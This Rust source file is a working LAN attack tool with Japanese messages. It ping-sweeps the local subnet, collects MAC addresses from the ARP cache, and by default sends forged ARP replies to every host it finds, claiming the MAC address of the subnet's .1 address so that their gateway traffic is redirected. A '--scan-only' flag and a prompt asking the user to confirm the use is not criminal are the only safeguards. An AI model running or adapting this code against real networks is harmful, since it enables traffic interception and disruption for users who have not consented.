use pnet::datalink::{self, NetworkInterface};
use pnet::packet::arp::{ArpOperation, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::icmp::{self, IcmpPacket, IcmpTypes};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{Ipv4Packet, MutableIpv4Packet};
use pnet::packet::{MutablePacket, Packet};
use pnet::transport::{TransportChannelType, transport_channel};
use pnet::util::MacAddr;
use std::collections::HashMap;
use std::env;
use std::io::ErrorKind;
use std::io::{self};
use std::net::{IpAddr, Ipv4Addr};
use std::process::Command;
use std::str::FromStr;
use std::thread;
use std::time::{Duration, Instant};

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum RunMode {
    ScanOnly,
    Full,
}

fn main() {
    let run_mode = parse_run_mode();

    println!(
        "\x1b[92m
    ██████╗  ██████╗  ██████╗    ██████╗   █████╗   ██████╗ ██╗  ██╗
    ██╔══██╗ ██╔══██╗ ██╔══██╗   ██╔══██╗ ██╔══██╗ ██╔════╝ ██║ ██╔╝
    ███████║ ██████╔╝ ██████╔╝   ██████╔╝ ███████║ ██║      █████╔╝
    ██╔══██║ ██╔══██╗ ██╔═══╝    ██╔═══╝  ██╔══██║ ██║      ██╔═██╗
    ██║  ██║ ██║  ██║ ██║   ██╗  ██║      ██║  ██║ ╚██████╗ ██║  ██╗
    ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═╝   ╚═╝  ╚═╝      ╚═╝  ╚═╝  ╚═════╝ ╚═╝  ╚═╝

    ███████╗ ███████╗ ███╗   ██╗ ██████╗  ███████╗ ██████╗
    ██╔════╝ ██╔════╝ ████╗  ██║ ██╔══██╗ ██╔════╝ ██╔══██╗
    ███████╗ █████╗   ██╔██╗ ██║ ██║  ██║ █████╗   ██████╔╝
    ╚════██║ ██╔══╝   ██║╚██╗██║ ██║  ██║ ██╔══╝   ██╔══██╗
    ███████║ ███████╗ ██║ ╚████║ ██████╔╝ ███████╗ ██║  ██║
    ╚══════╝ ╚══════╝ ╚═╝  ╚═══╝ ╚═════╝  ╚══════╝ ╚═╝  ╚═╝
\x1b[0m"
    );

    match run_mode {
        RunMode::ScanOnly => println!("ネットワークスキャン(ping)のみを実行します。"),
        RunMode::Full => println!("ネットワークスキャン(ping),ARPスプーフィングを実行します。"),
    }
    println!(
        "※\x1b[31mこれは実験用のソフトであるため、自分の管理下のネットワークでのみ使用してください。\x1b[0m"
    );

    println!("犯罪行為ではないならyキーを押して続行。(y以外を押すと終了します。)");
    let mut buf = String::new();
    io::stdin().read_line(&mut buf).unwrap();
    if buf.trim() != "y" {
        return;
    }

    println!("ーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーー");
    println!("⟦ ネットワークの初期化を開始 ⟧");

    let mut arrow_ping_ips: Vec<Ipv4Addr> = Vec::new();

    let interface = datalink::interfaces()
        .into_iter()
        .find(|iface: &NetworkInterface| {
            iface.is_up() && !iface.is_loopback() && iface.is_broadcast()
        })
        .expect("利用可能なネットワークインターフェースが見つかりませんでした");

    let interface_name = &interface.name;
    println!("使用するインターフェース: {}", interface_name);

    let my_ip = interface
        .ips
        .iter()
        .find_map(|ip_network| match ip_network.ip() {
            IpAddr::V4(v4) => Some(Ipv4Addr::from(v4.octets())),
            IpAddr::V6(_) => None,
        })
        .unwrap();
    println!("IPアドレス: {}", my_ip);

    println!("ーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーー");
    println!("⟦ ネットワークのスキャンを開始 ⟧");

    let (mut tx, mut _rx) = transport_channel(
        1024,
        TransportChannelType::Layer3(IpNextHeaderProtocols::Icmp),
    )
    .unwrap();

    println!("(pingを送信中...)");
    let _sender_handle = thread::spawn(move || {
        for i in 1..255 {
            let target_ip =
                Ipv4Addr::new(my_ip.octets()[0], my_ip.octets()[1], my_ip.octets()[2], i);
            let mut ipv4_buffer = [0u8; 40];
            let mut icmp_buffer = [0u8; 8];

            let mut icmp_packet =
                icmp::echo_request::MutableEchoRequestPacket::new(&mut icmp_buffer).unwrap();
            icmp_packet.set_icmp_type(IcmpTypes::EchoRequest);
            icmp_packet.set_identifier(1);
            icmp_packet.set_sequence_number(i as u16);

            let checksum = icmp::checksum(&IcmpPacket::new(icmp_packet.packet()).unwrap());
            icmp_packet.set_checksum(checksum);

            let mut ipv4_packet = MutableIpv4Packet::new(&mut ipv4_buffer).unwrap();
            ipv4_packet.set_version(4);
            ipv4_packet.set_header_length(5);
            ipv4_packet.set_total_length(40);
            ipv4_packet.set_ttl(64);
            ipv4_packet.set_next_level_protocol(IpNextHeaderProtocols::Icmp);
            ipv4_packet.set_source(my_ip);
            ipv4_packet.set_destination(target_ip);
            ipv4_packet.set_payload(icmp_packet.packet_mut());

            if let Err(e) = tx.send_to(ipv4_packet.to_immutable(), IpAddr::V4(target_ip)) {
                eprintln!("{}へのping送信に失敗: {}", target_ip, e);
            }

            thread::sleep(Duration::from_millis(10));
        }
    });

    println!("(ping送信完了)");
    println!("(pingの応答を待機中...)");

    let mut config = datalink::Config::default();
    config.read_timeout = Some(Duration::from_secs(1));

    let (_tx_dummy, mut datalink_rx) = match datalink::channel(&interface, config) {
        Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("非対応の datalink チャネルです。"),
        Err(e) => panic!("datalinkチャンネルのエラー: {}", e),
    };

    let start = Instant::now();
    let timeout = Duration::from_secs(10);

    loop {
        if start.elapsed() >= timeout {
            break;
        }

        match datalink_rx.next() {
            Ok(frame) => {
                if let Some(eth) = EthernetPacket::new(frame) {
                    if eth.get_ethertype() == EtherTypes::Ipv4 {
                        if let Some(ipv4) = Ipv4Packet::new(eth.payload()) {
                            if ipv4.get_next_level_protocol() == IpNextHeaderProtocols::Icmp {
                                if let Some(icmp) = IcmpPacket::new(ipv4.payload()) {
                                    let src = ipv4.get_source();
                                    if icmp.get_icmp_type() == IcmpTypes::EchoReply
                                        && icmp.packet().len() >= 8
                                    {
                                        arrow_ping_ips.push(src);
                                        println!("  [Pingへの応答] from: {}", src);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            Err(e) => {
                if e.kind() == ErrorKind::TimedOut {
                    thread::sleep(Duration::from_millis(5));
                    continue;
                }
                eprintln!("Pongの受信処理でエラーが発生しました: {:?}", e);
                break;
            }
        }
    }

    println!("{}個のIPアドレスが応答しました", arrow_ping_ips.len());

    println!(
        "ーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーー"
    );
    println!("⟦ ARPリクエストを送信 ⟧");

    let (mut tx_datalink, mut _rx_datalink) =
        match datalink::channel(&interface, datalink::Config::default()) {
            Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("ARPリクエスト用のRaw Ethernet channelの作成に失敗しました。"),
            Err(e) => panic!("datalinkチャンネルのエラー: {}", e),
        };

    let mut ethernet_buffer = [0u8; 42];
    let mut arp_buffer = [0u8; 28];

    let my_mac = interface
        .mac
        .expect("インターフェースにMACアドレスがありません");
    let my_ipv4_addr = my_ip;

    for target_ip in &arrow_ping_ips {
        println!("  [ARPリクエスト送信先] {} ... ", target_ip);

        let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
        ethernet_packet.set_destination(MacAddr::broadcast());
        ethernet_packet.set_source(my_mac);
        ethernet_packet.set_ethertype(EtherTypes::Arp);

        let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
        arp_packet.set_hardware_type(pnet::packet::arp::ArpHardwareType::new(1));
        arp_packet.set_protocol_type(EtherTypes::Ipv4);
        arp_packet.set_hw_addr_len(6);
        arp_packet.set_proto_addr_len(4);
        arp_packet.set_operation(ArpOperation::new(1));
        arp_packet.set_sender_hw_addr(my_mac);
        arp_packet.set_sender_proto_addr(my_ipv4_addr);
        arp_packet.set_target_hw_addr(MacAddr::zero());
        arp_packet.set_target_proto_addr(*target_ip);

        ethernet_packet.set_payload(arp_packet.packet_mut());

        let _ = tx_datalink.send_to(ethernet_packet.packet(), None).unwrap();
        thread::sleep(Duration::from_millis(50));
    }

    println!("(ARPリクエスト送信完了)");

    let arp_cache = load_arp_cache();

    for (ip, mac) in &arp_cache {
        println!("  [ARPキャッシュテーブル]{} : {}", ip, mac);
    }

    if run_mode == RunMode::ScanOnly {
        println!(
            "ーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーー"
        );
        println!("⟦ スキャンのみモードのため、ARPスプーフィングはスキップしました ⟧");
        println!("⟦ ＞＞＞すべての工程が終了しました＜＜＜ ⟧");
        return;
    }

    println!(
        "ーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーー"
    );
    println!("⟦ ARPスプーフィングを開始 ⟧");

    let mut config = datalink::Config::default();
    config.read_timeout = Some(std::time::Duration::from_secs(1));
    let (mut tx, mut _rx) = match datalink::channel(&interface, config) {
        Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Raw Ethernet channelの作成に失敗しました。"),
        Err(e) => panic!("エラー: {}", e),
    };

    for (ip, mac) in &arp_cache {
        arp_send(&mut tx, interface.clone(), *mac, *ip);
    }

    println!(
        "ーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーー"
    );
    println!("⟦ ＞＞＞すべての工程が終了しました＜＜＜ ⟧");
}

fn parse_run_mode() -> RunMode {
    let args: Vec<String> = env::args().collect();

    if args.iter().any(|arg| arg == "-h" || arg == "--help") {
        println!("Usage: {} [--scan-only]", args[0]);
        println!("  --scan-only   Ping/ARP収集のみを行い、ARPスプーフィングは実行しません。");
        std::process::exit(0);
    }

    if args.iter().any(|arg| arg == "--scan-only") {
        RunMode::ScanOnly
    } else {
        RunMode::Full
    }
}

fn load_arp_cache() -> HashMap<Ipv4Addr, MacAddr> {
    let mut arp_cache: HashMap<Ipv4Addr, MacAddr> = HashMap::new();

    #[cfg(target_os = "linux")]
    {
        if let Ok(output) = Command::new("ip").arg("neigh").arg("show").output() {
            let stdout = String::from_utf8_lossy(&output.stdout);

            for line in stdout.lines() {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 5 && parts[3] == "lladdr" {
                    if let (Ok(ip), Ok(mac)) =
                        (Ipv4Addr::from_str(parts[0]), MacAddr::from_str(parts[4]))
                    {
                        arp_cache.insert(ip, mac);
                    }
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    {
        if let Ok(output) = Command::new("arp").arg("-a").output() {
            let stdout = String::from_utf8_lossy(&output.stdout);

            for line in stdout.lines() {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() < 2 {
                    continue;
                }

                let ip = parts.iter().find_map(|part| Ipv4Addr::from_str(part).ok());
                let mac = parts
                    .iter()
                    .find(|part| part.matches('-').count() == 5 || part.matches(':').count() == 5)
                    .and_then(|part| MacAddr::from_str(&part.replace('-', ":")).ok());

                if let (Some(ip), Some(mac)) = (ip, mac) {
                    arp_cache.insert(ip, mac);
                }
            }
        }
    }

    arp_cache
}

fn arp_send(
    tx: &mut Box<dyn datalink::DataLinkSender>,
    interface: NetworkInterface,
    mac: MacAddr,
    ip: Ipv4Addr,
) {
    let mut ethernet_buffer = [0u8; 42];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

    ethernet_packet.set_destination(mac);
    ethernet_packet.set_source(interface.mac.unwrap());
    ethernet_packet.set_ethertype(pnet::packet::ethernet::EtherTypes::Arp);

    let mut arp_buffer = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();

    arp_packet.set_hardware_type(pnet::packet::arp::ArpHardwareType::new(1));
    arp_packet.set_protocol_type(pnet::packet::ethernet::EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperation::new(2));
    arp_packet.set_sender_hw_addr(interface.mac.unwrap());
    arp_packet.set_sender_proto_addr(
        interface
            .ips
            .iter()
            .find_map(|ip_network| match ip_network.ip() {
                IpAddr::V4(v4) => {
                    let mut octets = v4.octets();
                    octets[3] = 1;
                    Some(Ipv4Addr::from(octets))
                }
                IpAddr::V6(_) => None,
            })
            .unwrap(),
    );
    arp_packet.set_target_hw_addr(mac);
    let target_ip: Ipv4Addr = ip;
    arp_packet.set_target_proto_addr(target_ip);

    ethernet_packet.set_payload(arp_packet.packet_mut());

    tx.send_to(ethernet_packet.packet(), None).unwrap().unwrap();
    println!("ARPスプーフィングを実行しています。宛先: {}", target_ip);
}
